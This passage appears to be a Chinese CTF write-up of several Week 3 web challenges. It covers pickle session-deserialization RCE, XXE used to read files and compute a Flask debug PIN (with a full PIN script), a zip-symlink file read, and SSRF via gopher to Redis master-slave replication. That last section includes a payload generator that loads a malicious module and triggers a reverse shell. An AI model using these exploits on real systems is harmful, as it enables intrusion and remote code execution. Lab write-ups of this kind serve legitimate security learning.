class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">add_note</span>():</span><br><span class="line">    note_name = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;note_name&#x27;</span>)</span><br><span class="line">    note_content = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;note_content&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> note_name == <span class="string">&#x27;&#x27;</span> or note_content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;add_failed&#x27;</span>, msg=<span class="string">&#x27;note name or content is empty&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note_id = <span class="title function_">str</span>(uuid.<span class="title function_">uuid4</span>())</span><br><span class="line">    note = <span class="title class_">Note</span>(note_name, note_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not session.<span class="title function_">get</span>(<span class="string">&#x27;notes&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;notes&#x27;</span>] = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    notes = session[<span class="string">&#x27;notes&#x27;</span>]</span><br><span class="line">    notes[note_id] = pickle.<span class="title function_">dumps</span>(note)</span><br><span class="line">    session[<span class="string">&#x27;notes&#x27;</span>] = notes</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;add_success&#x27;</span>, note_id=note_id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">delete_note</span>():</span><br><span class="line">    note_id = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;note_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">note_id</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    notes = session.<span class="title function_">get</span>(<span class="string">&#x27;notes&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">notes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_failed&#x27;</span>, msg=<span class="string">&#x27;You have no notes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> not notes.<span class="title function_">get</span>(note_id):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_failed&#x27;</span>, msg=<span class="string">&#x27;This note does not exist&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    del notes[note_id]</span><br><span class="line">    session[<span class="string">&#x27;notes&#x27;</span>] = notes</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="title class_">False</span>)</span><br></pre></td></tr></table></figure><p>大致审计一下 </p><p>大致思路为<code>/add_note</code>下会将我们提交的数据进行pickle序列化 内容保存在session中</p><p>然后在<code>/&lt;path:note_id&gt;</code>进行pickle反序列化</p><p>那么如果我们可以控制session 将里面的正常序列化数据改为恶意数据 那么就可以实现RCE了</p><p>遇到的一些问题：</p><ol><li>首先是flask_unsign脚本爆破sercet的问题 这个脚本需要最原始的session来进行爆破 如果是提交了任何参数的session都会爆不出secret</li><li>因为我们opcode加上我们的payload一般还有一些特殊字符比如<code>/ &amp;</code>那么进行伪造session的时候就会涉及到转义的问题 转义头都大了 这里Aecous师傅提供了一种好的方法 可以现在自己本地搭建好题目 然后修改相关生成的session的参数 让题目自己去处理session转义问题 然后直接本地获取含恶意payload的session然后再提交给题目 （记得本地secret_key也要保持和题目一致 ）<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697614101618-a7dbef85-9523-4e2f-a60a-72a72819d305.png" alt="img"></li><li>关于R指令的问题这个题目好像R指令稍稍有点问题导致没法弹回payload 可以试着用其他指令比如我用的是i指令  （回来补坑了 因为用pickle.dumps()  来生成 payload, 不同操作系统⽣成的 pickle 序列化数据是有区别的   因此我们windows生成的payload在linux用不了 参考：<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区</a>）</li></ol><h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="[Week 3] rss_parser"></a>[Week 3] rss_parser</h2><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> urllib.<span class="property">parse</span> <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> <span class="title class_">BytesIO</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.<span class="property">method</span> == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        feed_url = request.<span class="property">form</span>[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> not re.<span class="title function_">match</span>(r<span class="string">&#x27;^(http|https)://&#x27;</span>, feed_url):</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        content = requests.<span class="title function_">get</span>(feed_url).<span class="property">content</span></span><br><span class="line">        tree = etree.<span class="title function_">parse</span>(<span class="title class_">BytesIO</span>(content), etree.<span class="title class_">XMLParser</span>(resolve_entities=<span class="title class_">True</span>))</span><br><span class="line"></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        rss_title = tree.<span class="title function_">find</span>(<span class="string">&#x27;/channel/title&#x27;</span>).<span class="property">text</span></span><br><span class="line">        rss_link = tree.<span class="title function_">find</span>(<span class="string">&#x27;/channel/link&#x27;</span>).<span class="property">text</span></span><br><span class="line">        rss_posts = tree.<span class="title function_">findall</span>(<span class="string">&#x27;/channel/item&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        result[<span class="string">&#x27;title&#x27;</span>] = rss_title</span><br><span class="line">        result[<span class="string">&#x27;link&#x27;</span>] = rss_link</span><br><span class="line">        result[<span class="string">&#x27;posts&#x27;</span>] = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(rss_posts) &gt;= <span class="number">10</span>:</span><br><span class="line">            rss_posts = rss_posts[:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> post <span class="keyword">in</span> <span class="attr">rss_posts</span>:</span><br><span class="line">            post_title = post.<span class="title function_">find</span>(<span class="string">&#x27;./title&#x27;</span>).<span class="property">text</span></span><br><span class="line">            post_link = post.<span class="title function_">find</span>(<span class="string">&#x27;./link&#x27;</span>).<span class="property">text</span></span><br><span class="line">            result[<span class="string">&#x27;posts&#x27;</span>].<span class="title function_">append</span>(&#123;<span class="string">&#x27;title&#x27;</span>: post_title, <span class="string">&#x27;link&#x27;</span>: <span class="title function_">unquote</span>(post_link)&#125;)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, feed_url=feed_url, result=result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="title class_">True</span>)</span><br></pre></td></tr></table></figure><p>简单审计</p><p>大致思路为它会通过http协议去访问一个网站 然后将其访问到的内容通过xml解析出来 然后正则匹配相关的内容 然后帮我们渲染出来</p><p><code>resolve_entities=True</code>重点关注这个 如果这个选项被设置为了true 那么它就会帮我们解析xml实体</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598725169-4234b27f-2cd7-4f45-9a3d-a74ee5c59a88.png" alt="img"></p><p>来自：<a href="https://github.com/MisakiKata/python_code_audit/blob/master/XXE.md">python_code_audit&#x2F;XXE.md at master · MisakiKata&#x2F;python_code_audit</a></p><p>除此之外<code>debug=True</code>这意味着 如果我们能计算出pin值 我们就可以通过<code>/console</code>直接进行rce</p><p>所以我们的思路就是:</p><ol><li>用vps起一个python http服务 然后把有恶意内容的xml文件放其目录中</li><li>访问 读取相关计算pin码的文件</li><li>rce</li></ol><p>xml文件内容如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598961969-50ab931f-47fc-41ad-87bd-af42dac22163.png" alt="img"></p><p>起http服务</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598998390-a5a202e2-73c9-4947-bc4d-21ebe510f301.png" alt="img"></p><p>读取到相关配置文件内容</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599022319-c2bbeff1-534b-4a27-b482-759dbb2f87fb.png" alt="img"></p><p>然后这道题目其实<code>/proc/self/cgroup</code>是空的 </p><p>只需要读取<code>/etc/machine-id</code>值就可以计算machine-id了</p><p>然后用户是app 路径报错得到</p><p>计算pin码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>  # /etc/passwd</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span>  # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378744322&#x27;</span>,  # /sys/<span class="keyword">class</span>/net/eth0/address 十进制</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620&#x27;</span></span><br><span class="line">    # 字符串合并：<span class="number">1.</span>/etc/machine-<span class="title function_">id</span>(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id <span class="number">2.</span> /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 下面为源码里面抄的，不需要修改</span><br><span class="line">h = hashlib.<span class="title function_">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="title function_">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">bit</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.<span class="title function_">update</span>(bit)</span><br><span class="line">h.<span class="title function_">update</span>(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.<span class="title function_">hexdigest</span>()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> num is <span class="title class_">None</span>:</span><br><span class="line">    h.<span class="title function_">update</span>(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="title function_">int</span>(h.<span class="title function_">hexdigest</span>(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> rv is <span class="title class_">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.<span class="title function_">join</span>(num[<span class="attr">x</span>:x + group_size].<span class="title function_">rjust</span>(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rv)</span><br></pre></td></tr></table></figure><p>直接反弹shell</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599162719-3cedc115-53ec-4189-a3dd-c270b67a30c6.png" alt="img"></p><p>拿下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599180240-36084f24-009a-4ce6-9924-a6b4034ae184.png" alt="img"></p><h2 id="Week-3-zip-file-manager"><a href="#Week-3-zip-file-manager" class="headerlink" title="[Week 3] zip_file_manager"></a>[Week 3] zip_file_manager</h2><p>考点：</p><ul><li>软链接</li></ul><p>直接通过软链接将根目录下的flag勾出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag  test</span><br><span class="line">zip --symlinks test.<span class="property">zip</span> ./test</span><br></pre></td></tr></table></figure><h2 id="Week-3-web-snapshot"><a href="#Week-3-web-snapshot" class="headerlink" title="[Week 3] web_snapshot"></a>[Week 3] web_snapshot</h2><p>考点：</p><ul><li>redis主从复制</li><li>ssrf</li><li>gopher协议</li></ul><p>主要源码如下：</p><p>index.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_get</span>(<span class="params">$url</span>) &#123;</span><br><span class="line">    $curl = <span class="title function_">curl_init</span>();</span><br><span class="line">    <span class="title function_">curl_setopt</span>($curl, <span class="variable constant_">CURLOPT_URL</span>, $url);</span><br><span class="line">    <span class="title function_">curl_setopt</span>($curl, <span class="variable constant_">CURLOPT_HEADER</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_">curl_setopt</span>($curl, <span class="variable constant_">CURLOPT_RETURNTRANSFER</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_">curl_setopt</span>($curl, <span class="variable constant_">CURLOPT_FOLLOWLOCATION</span>, <span class="literal">true</span>);</span><br><span class="line">    $data = <span class="title function_">curl_exec</span>($curl);</span><br><span class="line">    <span class="title function_">curl_close</span>($curl);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">process</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    $redis-&gt;<span class="title function_">connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line">    $redis-&gt;<span class="title function_">slaveOf</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">preg_match</span>(<span class="string">&#x27;/^https?:\/\/.*$/&#x27;</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid URL! The URL must start with &lt;code&gt;http://&lt;/code&gt; or &lt;code&gt;https://&lt;/code&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $id = <span class="title function_">md5</span>($url.<span class="title function_">time</span>());</span><br><span class="line">        $data = <span class="title function_">_get</span>($url);</span><br><span class="line">        $redis-&gt;<span class="title function_">setEx</span>($id, <span class="number">600</span>, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Snapshot success! Link: &lt;a href=&quot;cache.php?id=&#x27;</span>.<span class="property">$id</span>.<span class="string">&#x27;&quot;&gt;cache.php?id=&#x27;</span>.<span class="property">$id</span>.<span class="string">&#x27;&lt;/a&gt;&lt;/div&gt;&lt;h2&gt;Source&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&#x27;</span>.<span class="title function_">htmlspecialchars</span>($data).<span class="string">&#x27;&lt;/code&gt;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ping.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">$redis-&gt;<span class="title function_">connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;<span class="title function_">slaveOf</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;<span class="title function_">ping</span>()) &#123;</span><br><span class="line">    echo <span class="string">&#x27;pong&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&#x27;Connection error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>cache.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">preg_match</span>(<span class="string">&#x27;/^[a-f0-9]&#123;32&#125;$/&#x27;</span>, $id)) &#123;</span><br><span class="line">    <span class="title function_">die</span>(<span class="string">&#x27;Invalid ID&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">$redis-&gt;<span class="title function_">connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;<span class="title function_">slaveOf</span>();</span><br><span class="line"></span><br><span class="line">$data = $redis-&gt;<span class="title function_">get</span>($id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($data) &#123;</span><br><span class="line">    echo $data;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">die</span>(<span class="string">&#x27;No snapshot found!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单审计就能看到index.php中存在ssrf 并且限制了只能以http&#x2F;https协议</p><p>当然curl除了http&#x2F;https协议外还支持dict&#x2F;gopher协议</p><p>再来看<code>curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018226430-3410ab03-23a4-4712-85ae-d877557cdeb5.png" alt="img"></p><p>当其被设置为true时 会根据服务器http头中的location进行重定向</p><p>二者结合起来 我们就可以通过 Location 头把协议从 http 重定向至 dict &#x2F; gopher</p><p>再审计cache.php和ping.php可知 web服务和redis服务不在一个服务器上</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018653945-607c1987-eeb6-425d-a26f-f9f4ac81ed90.png" alt="img"></p><p>这就导致我们没法直接通过写入文件getshell</p><p>那么就要利用到redis主从复制了 参考：<a href="https://paper.seebug.org/975/">Redis 基于主从复制的 RCE 利用方式</a></p><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>通过slave of设置主从状态</p><p>（偷的图）</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019249350-3254f8ce-2e21-4b7f-aea9-910c889e9878.png" alt="img"></p><p>可以看到在主机修改值之后会同步到从机上</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019683190-a07767fc-c9eb-4ebf-b931-66498429afc1.png" alt="img"></p><p>利用原理：</p><p>当两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上</p><p>然后我们可以利用从机加载so文件，我们就可以执行拓展的新命令了</p><p>整个流程图如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699020700294-a7f0ea3e-324f-4a9c-b88f-3127d90dc3fc.png" alt="img"></p><p>首先先生成重定向恶意文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line">poc1= <span class="string">&#x27;&#x27;</span><span class="string">&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">SLAVEOF ip port</span></span><br><span class="line"><span class="string">CONFIG SET dbfilename exp.so</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">#<span class="variable constant_">SLAVEOF</span>设置主服务器 我们自己的恶意服务器</span><br><span class="line">#<span class="variable constant_">CONFIG</span> <span class="variable constant_">SET</span> dbfilename为指定保存文件名</span><br><span class="line">poc2=<span class="string">&#x27;&#x27;</span><span class="string">&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">MODULE LOAD ./exp.so</span></span><br><span class="line"><span class="string">system.rev 123 123</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">#<span class="variable language_">module</span> load ./<span class="number">1.</span>so 加载恶意文件</span><br><span class="line"># system.<span class="property">rev</span>后面被<span class="title class_">Aecous</span>师傅魔改了，因为弹不了shell，正常使用就是ip port</span><br><span class="line">payload = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(poc1).<span class="title function_">replace</span>(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;gopher://db:6379/&quot;</span> + payload</span><br><span class="line"><span class="title function_">print</span>(payload)</span><br></pre></td></tr></table></figure><p>在vps起个php文件用<code>php -S 0.0.0.0:port</code>或者用nginx，apache都行</p><p>让题目去依次访问这两个文件</p><p>再起个恶意redis server 推荐：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">GitHub - Testzero-wz&#x2F;Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement</a></p><p> 恶意Server使用，-v为恶意Server模式，指定port和恶意文件开启监听  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -lport <span class="number">8888</span> -path exp.so  </span><br></pre></td></tr></table></figure><p>这里恶意so文件由Aecous师傅完成的真的tql</p><p>魔改RedisModulesSDK&#x2F;exp&#x2F;exp.c一个函数，make编译后生成exp.so文件  项目地址：<a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p><p>魔改内容为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 